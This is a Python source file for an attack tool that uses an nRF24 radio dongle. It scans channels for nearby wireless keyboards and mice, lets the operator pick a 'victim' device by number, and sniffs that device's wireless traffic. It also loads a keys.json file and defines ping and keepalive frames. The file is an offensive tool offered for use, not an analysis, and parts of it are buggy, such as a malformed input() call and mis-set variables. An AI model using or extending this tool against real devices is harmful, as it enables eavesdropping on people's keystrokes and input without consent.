import argparse
import os
import random
import json
from threading import Thread
from libraries import nrf24_reset
from libraries import nrf24
import time
import usb
from progress.bar import IncrementalBar, ShadyBar, PixelBar, Bar, FillingSquaresBar, ChargingBar, FillingCirclesBar
from progress.spinner import Spinner, MoonSpinner, PixelSpinner, PieSpinner, LineSpinner

presentation = '''

   _,.----.                  ,---.                                            ,--.-,   ,---.        _,.----.   ,--.-.,-.  
 .' .' -   \   .-.,.---.   .--.'  \      ,--,----. ,--.-.  .-,--.            |==' -| .--.'  \     .' .' -   \ /==/- |\  \ 
/==/  ,  ,-'  /==/  `   \  \==\-/\ \    /==/` - .//==/- / /=/_ /             |==|- | \==\-/\ \   /==/  ,  ,-' |==|_ `/_ / 
|==|-   |  . |==|-, .=., | /==/-|_\ |   `--`=/. / \==\, \/=/. /            __|==|, | /==/-|_\ |  |==|-   |  . |==| ,   /  
|==|_   `-' \|==|   '='  / \==\,   - \   /==/- /   \==\  \/ -/          ,--.-'\=|- | \==\,   - \ |==|_   `-' \|==|-  .|   
|==|   _  , ||==|- ,   .'  /==/ -   ,|  /==/- /-.   |==|  ,_/           |==|- |=/ ,| /==/ -   ,| |==|   _  , ||==| _ , \  
\==\.       /|==|_  . ,'. /==/-  /\ - \/==/, `--`\  \==\-, /            |==|. /=| -|/==/-  /\ - \\==\.       //==/  '\  | 
 `-.`.___.-' /==/  /\ ,  )\==\ _.\=\.-'\==\-  -, |  /==/._/             \==\, `-' / \==\ _.\=\.-' `-.`.___.-' \==\ /\=\.' 
             `--`-`--`--'  `--`         `--`.-.--`  `--`-`               `--`----'   `--`                      `--`       

'''
channels = range(2, 82)
radio = None
devices = dict()
counter = 0
ping = [0x0f, 0x0f, 0x0f, 0x0f]
f = open('keys.json')
keys = json.load(f)
keepalive_timeout2 = [0, 79, 0, 3, 112, 0, 0, 0, 0, 62]
keepalive_timeout1=[0, 79, 0, 0, 85, 0, 0, 0, 0, 92]
keepalive = [0, 64, 3, 112, 77]

def init():
    global channels
    global radio
    nrf24_reset.reset_radio(0)
    # Initialize the radio
    radio = nrf24.nrf24(0)
    print('[+] radio initialized')
    radio.enter_promiscuous_mode()
    print('[+] entered promescious mode ')
    radio.enable_lna()
    print('[+] enabled low noise amp')

    # Set the channels
    radio.set_channel(channels[0])
    print('[+] Using channels[ {0}'.format(', '.join(str(c) for c in channels)))


def addr_to_str(addr):
    return ':'.join('{:02X}'.format(x) for x in addr)


def str_to_addr(addr):
    address = []
    lis = addr.split(':')
    for x in lis:
        address.append(int(x, 16))
    return address[::-1]


def scan(timeout=60):
    global devices
    global radio
    global channels
    curr_time = time.time()
    end_time = time.time() + timeout
    channel_index = 0

    while time.time() < end_time:
        if len(channels) > 1 and time.time() - curr_time >= 0.1:
            channel_index = (channel_index + 1) % (len(channels))
            radio.set_channel(channels[channel_index])
            curr_time = time.time()

        payload = radio.receive_payload()
        if len(payload) >= 5:
            address, data = payload[0:5], payload[5:]
            address = addr_to_str(address)
            add_device(address, channels[channel_index])


def add_device(addr, ch):
    global counter
    global devices
    if addr not in devices.keys():
        devices[addr] = {}
        devices[addr]['channel'] = []
        devices[addr]['channel'].append(ch)
        devices[addr]['number'] = counter
        counter += 1

    elif ch not in devices[addr]['channel']:
        devices[addr]['channel'].append(ch)


# progressbar
def progress():
    bar_cls = FillingCirclesBar

    bar = bar_cls('loading')
    for i in bar.iter(range(200, 400)):
        sleep()


def sleep():
    t = 0.01
    t += t * random.uniform(-0.1, 0.1)  # Add some variance
    time.sleep(t)


# display a progress bar for aesthetics
def progressbar():
    bar_cls = IncrementalBar
    suffix = '%(percent)d%% [%(elapsed_td)s / %(eta)d / %(eta_td)s]'
    with bar_cls('Scanning', suffix=suffix, max=100) as bar:
        for i in range(100):
            bar.next()
            time.sleep(0.6)


# output the devices
def output_devices():
    global devices

    dash = '-' * 60
    print(dash)
    print('{:<20s}{:>10s}{:>24s}'.format('Number', 'Mac', 'CHs'))
    print(dash)
    for i in devices:
        print('{:<22s}{:<15s}{:>18s}'.format(str(devices[i]['number']), i, str(devices[i]['channel'])))


def choose_victim():
    global devices
    victim_num = input('choose the device of your victim by its number: ')
    while int(victim_num) >= len(devices) or int(victim_num) < 0:
        victim_num = input('please choose a number from 0 to, ', len(devices), ':')
    for i in devices.keys():
        if devices[i]['number'] == int(victim_num):
            return i


def attack(victim_mac):
    print('[+] sniffing')
    sniff_device(victim_mac)


def sniff_device(addr):
    global devices
    global radio
    a = [0, 211, 18, 163, 216, 250, 76, 215, 220, 137, 114, 218, 152, 251, 0, 0, 0, 0, 0, 0, 0, 63]
    b = [111, 140, 102, 4, 126, 199, 217]
    # sniffer mode allows us to spoof the mac address
    last_found = time.time()
    timeout = 0.1
    mac_address = str_to_addr(addr)
    found = False
    radio.enter_sniffer_mode(mac_address)
    while True:
        if time.time() - last_found > timeout:
            if not radio.transmit_payload(ping, 10, 5):
                found = False
                for channel in devices[addr]['channel']:
                    radio.set_channel(channel)
                    if radio.transmit_payload(ping, 10, 5):
                        last_found = time.time()
                        last_found = True
                        break
            else:
                last_found = time.time()
        value = radio.receive_payload()

        if value[0] == 0:
            i = 0


            print(value[1:])
            # Reset the channel timer
            last_ping = time.time()


if __name__ == "__main__":
    print(presentation)
    progress()
    os.system('clear')
    init()
    time.sleep(1)
    print('[+] Scanning for devices please wait, This will take a minute')
    time.sleep(1)
    progbar = Thread(target=progressbar)
    progbar.start()
    scan()
    output_devices()
    victim_mac = choose_victim()
    print('attacking victim mac: ', victim_mac)
    sniff_device(victim_mac)
